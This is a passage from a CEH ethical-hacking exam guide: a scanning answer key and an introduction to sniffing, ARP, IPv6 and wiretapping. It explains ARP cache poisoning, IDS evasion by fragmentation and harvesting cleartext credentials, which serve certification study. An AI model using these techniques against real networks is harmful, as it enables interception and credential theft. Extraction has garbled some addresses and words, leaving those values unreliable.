B. Port scanning is designed to overload the ports on a target in order to identify

which are open and which are closed.
C. Port scanning is designed as a method to view all traffic to and from a system.
D. Port scanning is used to identify potential vulnerabilities on a target system.

03-ch03.indd 139 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

CEH Certified Ethical Hacker All-in-One Exam Guide

140

Answers
1. A. The -A switch turns on OS detection, version detection, script scanning, and

traceroute, just as the -O, -sV, -sC, and -traceroute switches do in conjunction
with each other.

2. A, C. Both Telnet and Netcat, among others, can be used for banner grabbing.
The correct syntax for both has the port number last.

3. A. Fragmenting packets is a great way to evade an IDS, for any purpose. Sometimes
referred to as IP fragments, splitting a TCP header across multiple packets can serve
to keep you hidden while scanning.

4. B. Generally, any activity noted in a question that does not explicitly state you are
crafting packets and injecting them toward a system indicates you are passively
observing traffic—in this case, most likely with a sniffed traffic log.

5. C. A three-way TCP handshake has the originator forward a SYN. The recipient,
in step 2, sends a SYN and an ACK. In step 3, the originator responds with an
ACK. The steps are referred to as SYN, SYN/ACK, ACK.

6. A. According to ECC, if the TTL of the returned RST packet is less than 64, the
port is open.

7. A. An ACK packet received by a stateful firewall will not be allowed to pass unless
it was “sourced” from inside the network. No response indicates the firewall
filtered that port packet and did not allow it passage.

8. A. The RST flag forces both sides of the communications channel to stop. A FIN
flag signifies an ordered close to the communications.

9. D. If you look at the address 52.93.24.42 in binary, it looks like this: 00110100.0
1011101.00011000.00101010. The subnet mask given, /20, tells us only the first
20 bits count as the network ID (which cannot change if we are to stay in the same
subnet), and the remaining 12 bits belong to the host. Turning off all the host bits
(after the 20th) gives us our network ID: 00110100.01011101.00010000.000000
00 (52.93.16.0/20). Turning on all the host bits gives us our broadcast address: 001
10100.01011101.00011111.11111111 (52.93.31.255/20).

10. D. Syslog uses 514 by default. Even if you had no idea, the other answers
provided are very well-known default ports (FTP, Telnet, TFTP), so you can
eliminate them as possible answers.

11. C, D. Both the -sn and -PI switches will accomplish the task quickly and efficiently.
12. B. Since the IPID incremented by only one, this means the zombie hasn’t sent

anything since your original SYN/ACK to figure out the starting IPID. If the
IPID had increased by two, then the port would be open because the zombie
would have responded to the target machine’s SYN/ACK.

03-ch03.indd 140 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 3

Chapter 3: Scanning and Enumeration

141

13. A. A Type 11 ICMP packet indicates the TTL for the packet has reached 0;
therefore, it must take the Carrousel (from the movie Logan’s Run) and disappear
to a better place.

14. C. ECC defines as a stealth scan what most of us used to call a half-open scan
(although I suppose it would actually make more sense mathematically to call it
a two-thirds scan, since it’s a three-way handshake and only two are used). This is
also known as a SYN scan.

15. D. Port scanning has a singular purpose—to knock on ports and see if they’re
open (listening). Does an open port necessarily mean something is wrong? No,
but it does represent a potential vulnerability you can exploit later.

03-ch03.indd 141 14/09/21 3:54 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CHAPTER

Sniffing and Evasion 4
In this chapter you will

• Describe sniing concepts, including active and passive sniing and protocols
susceptible to sniing

• Describe ethical hacking techniques or Layer 2 traic
• Describe sniing tools and understand their output
• Describe sniing countermeasures
• Learn about intrusion detection system (IDS), irewall, and honeypot types, use,

and placement
• Describe signature analysis within Snort
• Describe IDS, irewall, and honeypot evasion techniques

I used to work in an office building just up the road from my home. My office was
located at the end of a dead-end hallway that had a large window overlooking the giant
parking lot. Oftentimes, people would walk down to the end of the hallway and look out
the window for a while, longing for freedom during the middle of a harsh workday. And,
oftentimes, they went down there to take or place personal calls on their cell phones.
And, I don’t know, but I just assumed everyone knew sound travels.

These people talked to their girlfriends, boyfriends, and, on a couple of occasions, the
“other woman.” They called up banks and talked about their accounts or loans. They
called businesses they’d applied to, trying to work out interview times and other issues.
And all of this they did without any knowledge (or perhaps concern) that someone
was involuntarily listening to all their conversations. Thankfully, for all these folks, I’m
not an evil little guy. If I were, I would have been drawing from several bank accounts.
I could also have set up and run a very successful dating agency—or a source for divorce
proceedings.

In much the same way as this example, people have conversations over a network all
the time, without having any idea someone else could be listening in. In this chapter,
we’re going to discuss ways for you to sit in the cramped little corner office of the network
wire, listening in on what people are saying over your target subnet. We’ll also include a
little discussion on efforts to stop your network intrusion and, hopefully, steps you can
take around those efforts.

143

04-ch04.indd 143 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

144

Essentials
Most people consider eavesdropping to be a little on the rude side. When it comes to
your career as a pen tester, though, you’re going to have to get over your societal norms
and become an ace at eavesdropping—well, an ace at virtual eavesdropping anyway.
Sniffing (often construed as wiretapping by law enforcement types, something we’ll exam-
ine in detail later) is the art of capturing packets as they pass on a wire, or over the air-
waves, to review for interesting information. This information could simply be addresses
to go after or information on another target. It can also be as high value as a password or
other authentication code. Believe it or not, some applications send passwords and such
in the clear, making things a heck of a lot easier for you. A sniffer is the tool you’ll use
to accomplish this, and a host of different ones are available. Before I get into all that,
though, let’s get some basics out of the way.

Network Knowledge for Sniffing
Before getting into sniffing and sniffers per se, we’ll spend just a little more time discuss-
ing communications basics and what they mean to sniffing. No, I’m not going to revisit
the networking basics stuff again, but we do need to review how network devices listen
to the wire (or other media used for your network) and how all these topics tie together.
See, network devices don’t just start babbling at each other like we humans do. They’re
organized and civilized in their efforts to communicate with each other. Believe it or not,
your understanding of this communications process is critical to your success in sniffing.
If you don’t know how addressing works and what the protocols are doing at each layer,
your time spent looking at sniffer output will be nothing more than time wasted.

The process of sniffing comes down to a few items of great importance: what state the
network interface card (NIC) is in, what access medium you are connected to, and what
tool you’re running. Because a sniffer is basically an application that looks at all frames
passing on a medium for your perusal, and because you already know the full commu-
nications process, I would imagine it’s easy for you to understand why these three items
are of utmost importance.

EXAM TIP You probably (should) know this already, but the IPv4 loopback
address (denoting the sotware loopback o your own machine) is
127.0.0.1, and the MAC address o broadcast messages is FF:FF:FF:FF:FF:FF.
The IPv6 address is ::1. Additionally, it may be helpul to know a loopback
doesn’t actually touch the NIC—it’s purely in sotware.

First, let’s consider your NIC. This little piece of electronic genius works by listening
to a medium (a wire most often, or the airwaves in the case of wireless) and looking for
messages that match its address (or an address it’s supposed to be looking at, such as a
broadcast or multicast message). This address, known as a MAC (Media Access Control),
physical, or burned-in address, is a unique identifier assigned to a NIC for communica-
tions at the Data Link layer of a network segment. It’s 48 bits long and is generally
displayed as 12 hex characters separated by colons. The first half of the MAC address is

04-ch04.indd 144 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

145

known as the organizationally unique identifier (OUI; assigned to the NIC manufac-
turer) and the second half provides a unique number to identify that particular card. This
addressing ensures each NIC in each device on a subnet has a specific, unique address.

NOTE Even though it’s considered a physical address, there are special
instances where MAC addresses don’t reer to a single, speciic card.
Broadcast and multicast messages inside a network have their own MAC
addresses as well. NICs on the subnet look at these rames as they arrive
on the medium and open them just as they would rames with their own
MAC address.

If the NIC is on an electric wire (and for the rest of this example, let’s assume it is
working in a standard Ethernet network), it reacts when specific electric voltage hits the
wire and then begins reading the bits coming in. If the bits come in the form of a frame, it
looks at the ones making up the destination address. If that address matches its own MAC
address, the broadcast address for the subnet, or a multicast address it is aware of, the NIC
pulls the frame from the wire and lets the operating system begin working on it. In short,
your NIC (under the influence and control of your operating system and its associated
drivers) will see anything passing by but normally won’t process any frame not addressed
to it. You have to tell it to do so.

A sniffer needs your card to run in something called promiscuous mode. This simply
means that, regardless of address, if the frame is passing on the wire, the NIC will grab it
and pull it in for a look. Because NICs are designed to pay attention only to unicast mes-
sages addressed appropriately, multicast messages, or broadcast messages, you need some-
thing that forces it to behave for your sniffer. In other words, your NIC “sees” everything
passing by on the wire but only pulls in and examines things it recognizes as addressed to
the host. If you wish for it (more specifically, the driver for the NIC) to pull everything
in for a look, you have to tell it to do so. WinPcap is an example of a driver that allows
the operating system to provide low-level network access and is used by a lot of sniffers
on Windows machine NICs.

EXAM TIP Regardless o OS, the NIC still has to be told to behave
promiscuously. On Windows, the de acto driver/library choice is
WinPcap. On Linux, it’s libpcap.

This brings up the second interesting point mentioned earlier—what wire, or medium,
you have access to. Ethernet (because it’s the most common, it’s what we’ll discuss) runs
with multiple systems sharing a wire and negotiating time to talk based on Carrier Sense
Multiple Access/Collision Detection (CSMA/CD). In short, any system can talk anytime
they want, so long as the wire is quiet. If two systems decide to talk at the same time, a
collision occurs, they back off, and everyone goes at it again. As long as your system is
within the same collision domain, right out of the box, and you don’t change a thing,
your NIC will see every message intended for anyone else in the domain. This doesn’t
mean your NIC will act on these messages. Again, it will only act on unicast messages

04-ch04.indd 145 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

146

A
A B B

C  C

A switch splits the collision domain: 4 domains. Shared media using a hub: 1 collision domain.
An attacker on A can only see traffic intended for A. An attacker on A can see all traffic for B and C.

Figure 4-1 Collision domains and sniing

addressed for the host and on broadcast/multicast messages for the subnet. Your NIC
usually only forwards the ones intended for you and ignores the rest. So, what constitutes
a collision domain? Is the whole world in a collision domain? See Figure 4-1.

Collision domains are composed of all the machines sharing any given transport
medium. In other words, if we’re all connected to the same wire and we use electricity to
talk to one another, every time I send a message to one person on the wire, everyone gets
shocked. Therefore, only one of us can talk at a time—if two try it simultaneously, the
voltage increases, and the messages will get all garbled up. Because we’re all connected
to the same wire, I don’t have to guess when anyone else is sending a message; I’m get-
ting shocked every time anyone sends anything. I don’t read them all, because they’re not
addressed for me, but I know they’re being sent.

Why all this talk about collision domains and who receives what from whom? Try
thinking about it this way: Suppose there are ten people in an open room together,
close enough to hear every word each one of them says. Bob, a gregarious guy who loves
humor, has a great joke and decides he wants to share it with Jane. He says, “Hey Jane,
want to hear a joke?” Jane says, “Sure, go ahead.” Bob says “Two corn chips are out in the
yard, but not playing with each other. One chip says to the other, ‘I get the feeling you
don’t like me, but I’d like to play. Can we taco about it?’ The other chip says, ‘No. I’m
nacho friend.’” Jane laughs, and so does Bill from the other side of the room.

Who in the room heard Bob start a message? Everyone, of course. Who acted on it?
Just Jane. Why? Because everyone heard Jane’s name up front and knew the message
was not for them, so they ignored it—even though they could hear the whole thing.

04-ch04.indd 146 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

147

Jane opened up a line of communication and listened while Bob told that ridiculous
joke. Bill, who decided he’d listen to everyone’s conversation, didn’t have to do a thing to
enjoy the joke message, even though it wasn’t intended for him. Got it now?

Armed with this knowledge, your sniffing options can be scrutinized appropriately.
Suppose, for example, you see systems connected to a hub. All systems connected to a
hub share the same collision domain; therefore, every system on the hub can hear the
stupid jokes every other system on the hub sends or receives. If the hub is taken out and
replaced with a switch, however, things change.

Switches split collision domains so that each system connected to the switch resides
in its own little collision domain—the switch sends frames down a wire for a given
computer only if they’re intended for the recipient. To continue our silly example, con-
sider the same setup, but this time everyone in the room is wearing soundproof head-
sets (like football coaches on the sideline) with individual frequency channels. When
Bob decides to tell his joke, he first tunes his transmitter to Jane’s frequency and starts
talking. Nobody else in the room hears the conversation. The only way Bill will start
laughing is if he has somehow tuned in to Bob’s or Jane’s frequency, to silently sit back
and listen to them.

This brings up a potential problem for the sniffing attacker. If you’re connected to a
switch and you receive only those messages intended for your own NIC, what good is it
to sniff? This is an excellent question and a good reminder that it’s important to know
what you actually have access to, media-wise. We’ll revisit this in just a moment when we
start discussing active sniffing.

Protocols Susceptible to Sniffing
Once you figure out how to start looking at all those packets you’re pulling in (and we’ll
get to that in a minute), you may start asking yourself which ones are more important
than others. I mean, there are tons of packets. Millions of them. Billions. Surely some
of them are more important than others, right? Well, this is where knowledge of how
protocols work on a network comes into play.

There are some important protocols in the upper layers for you to pay attention to as
an ethical hacker—mainly because of their simplicity. When you think about an Applica-
tion layer protocol, remember it normally relies on other protocols for almost everything
else except its sole, primary purpose. For example, consider Simple Mail Transfer Pro-
tocol (SMTP). SMTP was designed to do one thing: carry an e-mail message. It doesn’t
know anything about IP addressing or encryption, or how big the network pipe is; its
only concern is packaging ASCII characters together to be given to a recipient. Because
SMTP was written to carry nothing but ASCII, there is virtually no security built into
the protocol at all. In other words, everything sent via SMTP, with no encryption added
at another layer, is sent as clear text, meaning it can be easily read by someone sniffing
the wire.

NOTE Ever heard o hardware protocol analyzers? They’re neat little boxes
that do a whole lot o data sniing and analyzing or you, automatically.
Companies such as Fluke, RADCOM, and Keysight all make versions.
Go check them out.

04-ch04.indd 147 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

148

Are there other Application layer protocols to pay attention to? You bet your Manwich
there are. For example, although FTP requires a user ID and password to access the server
(usually), the information is passed in clear text over the wire. TFTP passes everything
in clear text, and you can pull keystrokes from a sniffed Telnet session (user name and
password anyone?). SNMPv1 and NNTP (Network News Transfer Protocol) send their
passwords and data over clear text, as do IMAP and POP3. And HTTP? Don’t get me
started, what with all the data that one sends in the clear. Several Application layer proto-
cols have information readily available to captured traffic—you just need to learn where
to look for it. Sometimes data owners use an insecure application protocol to transport
information that should be kept secret. Sniffing the wire while these clear-text messages
go across will display all that for you.

NOTE This should probably go without saying, but the act that protocols
like the ones just mentioned send passwords in the clear should be a big
clue that, i at all possible, you should avoid using them.

Protocols at the Transport and Network layers can also provide relevant data. TCP
and UDP work in the Transport layer and provide the port numbers that both sides of
a data exchange are using. TCP also adds sequence numbers, which will come into play
later during session hijacking. IP is the protocol working at the Network layer, and there
is a load of information you can glean just from the packets themselves (see Figure 4-2).
An IP packet header contains, of course, source and destination IP addresses. However, it
also holds information such as the quality of service for the packet (Type of Service field)
and information on fragmentation of packets along the way (Identification and Fragment
Offset fields), which can prove useful in crafting your own fragmented packets later.

ARP
We’ve spent a little time covering some base information you’ll need regarding Application,
Transport, and Network layer protocols, but the Data Link layer is going to be a huge area
of focus for the sniffing portion of your exam (not to mention your success in sniffing).

Version IHL Type of service Total length

Identification Flags Header checksum

Time to live Protocol Header checksum

Source IP address

Destination IP address

IP options Padding

Data

Figure 4-2 IP packet header

04-ch04.indd 148 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

149

Frames are built in the Data Link layer, and that’s where all your local addressing hap-
pens. And how, pray tell, do systems discover the local, physical (MAC) address of other
machines they wish to communicate with? By asking, of course, and they ask with a little
protocol called Address Resolution Protocol (ARP).

ARP’s entire purpose in life is to resolve IP addresses to machine (MAC) addresses.
As noted earlier, while each IP packet provides the network address (needed to route the
packet across different networks to its final destination), the frame must have a MAC
address of a system inside its own subnet to deliver the message. So as the frame is being
built inside the sending machine, the system sends an ARP_REQUEST to find out
which MAC address inside the subnet can process the message. Basically it asks the
entire subnet, via a broadcasted message, “Does anyone have a physical address for the
IP address I have here in this packet? If so, please let me know so I can build a frame
and send it on.” If a machine on the local subnet has that exact IP, it responds with an
ARP_REPLY directly to the sender, saying “Why yes, I’m the holder of that IP address,
and my MAC address is _macaddress_.” The frame can then be built and the message sent.

Sometimes, though, the message is not intended for someone in your network segment.
Maybe it’s a packet asking for a web page, or an e-mail being sent to a server somewhere
up the Net, or maybe even a packet intended to start another yelling contest on Face-
book. In any case, if the IP address of the packet being sent is not inside the same subnet,
or is not already present in some fashion in your route table (that is, there’s no specific
route previously defined for the address), the route table on your host already knows the
packet should be sent to the default gateway (also known as the “route of last resort,” and
is generally your local router port). If it doesn’t happen to remember the default gateway’s
MAC address, it sends out a quick ARP request to pull it. Once the packet is properly
configured and delivered to the default gateway, the router opens it, looks in the route
table, and builds a new frame for the next subnet along the route path. As that frame is
being built, it again sends another ARP request: “Does anyone have a physical address for
the IP address I have here in this packet? If so, please let me know so I can build a frame
and send it on.” This continues on each subnet until the packet finds its true destination.

Want to know another interesting thing about ARP? The protocol retains a cache on
machines as it works—at least, in many implementations it does. This really makes a
lot of sense—why continue to make ARP requests for machines you constantly talk to?
To see this in action, you can use the ping, arp, and netsh commands on your Windows
machine. The command arp -a displays your current ARP cache—you can see all the
IP-to-MAC mappings your system knows about. Next, enter either arp -d * or netsh
interface ip delete arpcache. Try arp -a again, and you’ll see your cache cleared. Refill it
on the fly by pinging anything on your network. For example, I pinged a laptop over in
the corner with an address of 192.168.0.3. It responded, and my ARP cache has a new
entry (see Figure 4-3). Try it yourself on your network.

There are a couple of other relevant notes on ARP you should know. First, the proto-
col works on a broadcast basis. In other words, requests (“Does anyone have the MAC
for this IP address?”) and replies (“I do. Here’s my physical address—please add it to your
cache.”) are broadcast to every machine on the network. Second, the cache is dynamic—
that is, the information in it doesn’t stay there forever, and when your system gets an
updated ARP message, it overwrites the cache with the new information. Suppose, for

04-ch04.indd 149 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

150

Figure 4-3
ARP cache

example, Machine A shuts down for a while and sends no further messages. Eventually,
all system caches will delete its entry, almost as if it never existed. Suppose also that
Machine B changes its NIC and now has a new MAC address. As soon as it sends its first
ARP message, all systems on the network receiving it will update their caches with this
new MAC address.

EXAM TIP ARP, as well as the other protocols listed in this section, can be
tested heavily. Depending on your exam, you’ll be asked about it a lot.
Know raming, MAC addressing, and how ARP works. Trust me.

All of this is interesting information, but just how does it help a hacker? Well, if you
put on your logical thinking cap, you’ll quickly see how it could be a veritable gold mine
for your hacking efforts. A system on your subnet will build frames and send them out
with physical address entries based on its ARP cache. If you were to, somehow, change
the ARP cache on Machine A and alter the cached MAC address of Machine B to your
system’s MAC address, you would receive all communication Machine A intended to
send to Machine B. Suppose you went really nuts and changed the ARP entry for the
default gateway on all systems in your subnet to your own machine. Now you’re getting
all messages everyone was trying to send out of the local network, often the Internet.
Interested now?

Attackers can do this by sending something called a gratuitous ARP. It is a special
packet that updates the ARP cache of other systems before they even ask for it—in other
words, before they send an ARP_REQUEST. Its original intent when created was to
allow updates for outdated information, which helps with things like IP conflicts, clus-
tering, and other legitimate issues. In our world of hacking, though, it’s easy to see where
that could be taken advantage of.

04-ch04.indd 150 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

151

NOTE It is true that ARP is cached, but it’s also true that the cache is
temporary. I an attacker has persistent access, he can simply wait it out. I
you’d like to know just how long that wait would be, use netsh interface
ipv4 show interfaces, then netsh interface ipv4 show interface [IDx of
the interface you want]. The “Base Reachable Time” entry tells you!

IPv6
Another discussion point of great importance in sniffing (and really all things hacking) is
IP version 6. As you’re no doubt aware, IPv6 is the “next generation” of Internet Protocol
addressing and offers a whole new world of interesting terms and knowledge to memo-
rize for your exam (and your job). Because you’re already an IPv4 expert and know all
about the 32-bit address, which is expressed in decimal and consists of four octets, we’ll
focus a little attention on IPv6 and some things you may not know.

IPv6 was originally engineered to mitigate the coming disaster of IPv4 address deple-
tion (which, of course, didn’t happen as quickly as everyone thought, thanks to net-
work address translation and private networking). It uses a 128-bit address instead of
the 32-bit IPv4 version and is represented as eight groups of four hexadecimal digits
separated by colons (for example, 2002:0b58:8da3:0041:1000:4a2e:0730:7443). Methods
of abbreviation, making this overly complex-looking address a little more palatable, do
exist, however. Leading zeros from any groups of hexadecimal digits can be removed, and
consecutive sections of zeros can be replaced with a double colon (::). This is usually done
to either all or none of the leading zeros. For example, the group 0054 can be converted
to 54. See Figure 4-4 for an example of this address truncation in use.

NOTE The double colon can be used only once in an address. Apparently
using it more than once conuses routers and renders the address useless.
RFC 5952 addresses this issue.

Original Address: 2001:09bd: 0000:0000:0000:ff00: 0052:1829

Step 1:

Eliminate the
“Leading Zeros”

2001:09bd:0:0:0:ff00: 52:1829

Step 2:

Eliminate
“Consecutive Zeros”

Final, Truncated 2001:09bd: :ff00: 52:1829
Version

Figure 4-4 IPv6 address truncation

04-ch04.indd 151 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

152

Figure 4-5 Traffic
Version Flow label

IPv6 packet class

Next
Payload length Hop limit

header

Source address

Destination address

Despite the overly complex appearance of IPv6 addressing, the design actually reduces
router processing. The header takes up the first 320 bits and contains source and desti-
nation addresses, traffic classification options, hop count, and extension types. Referred
to as “Next Header,” this extension field lets the recipient know how to interpret the data
payload. In short, among other things, it points to the upper-layer protocol carried in the
payload. Figure 4-5 shows an IPv6 packet header.

EXAM TIP The IPv6 loopback address is 0000:0000:0000:0000:0000:0000:000
0:0001 and may be edited all the way down to ::1.

As with IPv4, which has unicast, multicast, and broadcast, IPv6 has its own address
types and scopes. Address types include unicast, multicast, and anycast, and the scopes
for multicast and unicast include link local, site local, and global. The good-old broad-
cast address in IPv4 (which is sent to all hosts in a network segment) is no longer used in
IPv6. Instead, multicast functions along with scope fulfill that necessity. Table 4-1 details
address types and scopes.

Addressing in IPv6 isn’t too terribly difficult to understand, but scope adds a little flair
to the discussion. Unicast is just like IPv4 (addressed for one recipient) and so is multi-
cast (addressed for many), but anycast is an interesting addition. Anycast works just like
multicast; however, whereas multicast is intended to be received by a bunch of machines
in a group, anycast is designed to be received and opened only by the closest member of
the group. The nearest member is identified in terms of routing distance; a host two hops
away is “closer” than one three hops away. Another way of saying it might be, “Whereas
multicast is used for one-to-many communication, anycast is used for one-to-one-of-
many communication.”

EXAM TIP In IPv6, the address block e80::/10 has been reserved or link-
local addressing. The unique local address (the counterpart o IPv4 private
addressing) is in the c00::/7 block. Preixes or site local addresses will
always be FEC0::/10.

04-ch04.indd 152 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

153

IPv6 Address Types Description

Unicast A packet addressed or, and intended to be received by, only one
host interace

Multicast A packet that is addressed in such a way that multiple host interaces
can receive it

Anycast A packet addressed in such a way that any o a large group o hosts
can receive it, with the nearest host (in terms o routing distance)
opening it

IPv6 Scopes Description

Link local Applies only to hosts on the same subnet

Site local Applies only to hosts within the same organization (that is, private
site addressing)

Global Includes everything

Table 4-1 IPv6 Addresses and Scopes

The scope for multicast or anycast defines how far the address can go. A link-local
scope defines the boundary at the local segment, with only systems on your network
segment getting the message. Anything past the default gateway won’t get the message
because routers won’t forward the packets. It’s kind of like the old 169.254.1–254.0
network range: it’s intended for private addressing only. Site-local scope is much the
same; however, it is defined via a site. A site in IPv6 addressing can be a fairly confusing
subject because the same rules apply as the link-local scope (not forwarded by a router).
But if you’re familiar with the private address ranges in IPv4 (10.0.0.0, 172.16–32.0.0,
and 192.168.0.0), the site should make sense to you. Think of it this way: link local can
be used for private networking and autoconfiguration of addressing like your out-of-the-
box easy networking of the 169.254.0.0 network, and site local is more akin to setting
up your private networks using predefined ranges.

As far as IPv6 on your exam goes, again it depends on which pool your random roll
of the virtual dice pulls for you. Some exams won’t even mention it, whereas others will
seem like it’s one of the only topics that matter. Most IPv6-type questions are easy—as
you can see from our discussion, this is mostly rote memorization. You’re not going to be
asked to divine network IDs or anything like that; you’ll just be quizzed on general knowl-
edge. It’s helpful to note, though, that IPv6 makes traditional network scanning very, very
difficult—in ECC parlance, it’s “computationally less feasible”—due to the larger address
space to scan. However, should an attacker get a hold of a single machine inside a native
IPv6 network, the “all hosts” link-local multicast address will prove quite handy.

Wiretapping
Finally, our last entry in fundamental sniffing concepts has to do with our friends in law
enforcement and what they do in regard to sniffing. Lawful interception is the process of
legally intercepting communications between two (or more) parties for surveillance on
telecommunications, VoIP (Voice over IP), data, and multiservice networks. Thankfully,
all of those ridiculous definitions and terms to remember regarding this seem to have
been ditched by EC-Council, so the basics here are all you need.

04-ch04.indd 153 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

154

NOTE Anyone else tired o the terms “active” and “passive”? Trust me, I’m sick
o them, too. I eel like Han Solo saying to Chewy, “It’s not my ault. It’s not my
ault!” However, it’s really not my ault. Wiretapping (monitoring a phone or
Internet conversation) can be active or passive. Active wiretapping involves
interjecting something into the communication (traic), or whatever reason.
Passive wiretapping only monitors and records the data. And, or urther
nerdy-goodness, an active tap is one requiring power, regenerating a signal,
whereas a passive tap requires no power, simply allowing duplication o signal.

As an aside, but very relevant to this discussion because ECC has it in the official
courseware, were you aware that the NSA wiretaps a gigantic amount of foreign Internet
traffic that just happens to come through U.S. servers and routers? PRISM (Planning
Tool for Resource Integration, Synchronization, and Management) is the data tool used
to collect said foreign intelligence passing through Uncle Sam’s resources. I don’t know any
more information on this and I don’t want to know—just passing on that EC-Council
knows this, too.

Can You Smell the Neurons?
Show of hands: How many of you have ever been at work or in a college class, sit-
ting behind a desk or in a cubicle, and had thoughts regarding your boss, company,
professor, or school that weren’t…nice? And how many of you are happy those
thoughts are yours and yours alone—that your boss or professor has no idea you’re
thinking them? If we’re all being honest, everyone has their hand raised. It’s human
nature to question your superiors and, apparently, to believe decisions made by
others don’t hold as much value as your own opinion. And it’s a huge blessing that
nobody knows what’s going on inside our own heads.

I mean, honestly, do you really want everyone to know exactly what you’re think-
ing all the time? For that matter, I’d bet you don’t want to know what everyone else
is thinking either. Pure, blunt honesty—what people really think—can sometimes
be downright cruel, and in a workplace could lead to your dismissal. Or worse. Sci-
ence fiction and horror writers have entertained us for years with tales of mutant
mind readers and brain-scanning technology that would make most of us shudder.
But is it really that far off? Could you “sniff ” brainwaves?

Brain scanning and imaging processes have moved forward by leaps and bounds.
A positron emission tomography (PET) scan shows actual brain processes by using
the sugar glucose in the brain to illustrate where neurons are firing. Magnetic
resonance imaging (MRI) and electroencephalography (EEG) have been around
for a long while and are used to show brain activity during psychological states and
map actual gray matter against spinal fluid. Neuroimaging as a field is fascinating to
read about, and discoveries to assist in treating Alzheimer’s and other brain diseases
seem only a small step forward each year. But each of these, at least as far as I know,

04-ch04.indd 154 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

155

still requires you to visit a doctor’s office and lay out in a giant tube, or have sensors
stuck all over your head and body. As far as I knew, nobody could remotely scan me
and tell what I’m thinking.

And then, while googling sniffers, sniffing, and other topics of interest for this
chapter in a previous edition (as an aside, be sure to include “network” before
“sniffing” in your search strings…yikes!), I came across an article in Fortune maga-
zine titled “Workplace Employee Brainwave Monitoring Is Already a Real Thing”
(http://fortune.com/2018/05/01/china-workers-brainwave-monitors/). I immedi-
ately discounted it as yet another attention-grabbing headline/tagline, but decided
to read it just out of pure humor—which quickly, at least for me anyway, turned to
horror. Because it’s true.

At the South China Morning Post, employees wear lightweight, wireless sensors
that fit under caps or other safety equipment. The sensors then broadcast informa-
tion about employee brain activity to computers that can detect spikes in emotions
like depression, anxiety, and rage. The caps help in assigning tasks, and can even
ensure employees are “encouraged to take a day off if you’re under stress.” Chinese
companies using the tech insist it helps reduce stress and the risk of workplace
injury for workers, and claim that the technology can boost revenue. One power
grid company estimates it increased revenue by 2 billion yuan ($315 million) over
the past few years, and the technology is expanding globally (a UK firm uses it on
railways to supposedly prevent accidents and, in one weird instance, to help archers
shoot better).

Did you catch that? Broadcast. Your emotional state is broadcast to a computer
so you can be analyzed (controlled) by your monitoring overlords. I know it sounds
like some weird, dumb science-fiction movie, but it’s true and it’s real. Some com-
panies in China have been using and refining this technology since 2014.

And get this—the tech is expanding rapidly. You can go to https://www.unicorn-
bi.com/ right now and buy your own Unicorn Brain Interface headset that allows
you to program brain-to-computer-command actions. And there are multiple com-
panies selling wearable headsets designed to actively stimulate (or deaden) specific
brainwaves to help you calm down, or concentrate more, or lose weight, or fill-in-
the-blank (https://www.diygenius.com/hacking-your-brain-waves/).

Are you comfortable with the idea your emotional state—and, maybe, your
actual thought patterns in the not-so-distant future—can be monitored remotely?
Is the image of everyone in the office plugged into Yivo’s tentacles, sharing thought
and emotional state, that far off? Someone wandering around the office with a small
satellite-dish-looking receiver looking for thoughtcrime maybe doesn’t seem that
much of a stretch anymore.

References to George Orwell’s book 1984 often produce scoffs and “that can’t
happen here—it’s pure fiction” responses. But maybe the Ministry of Truth doesn’t
seem so far-fetched anymore. Maybe, we’re going too far.

At least, that’s what I think.

04-ch04.indd 155 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

156

Active and Passive Sniffing
EC-Council breaks sniffing down into two main categories: passive and active. Passive
sniffing is exactly what it sounds like: plug in a sniffer and, without any other interaction
needed on your part, start pulling data packets to view at your leisure. Passive sniffing
works only if your machine’s NIC is part of the same collision domain as the targets
you want to listen to—something we beat to death in the previous section, remember?
Because hubs do not split a collision domain (hubs extend a collision domain), the hub is
your dream network device from a sniffing perspective. Anything plugged into a port on
a hub receives every message sent by anyone else plugged into it. Therefore, if you’re out
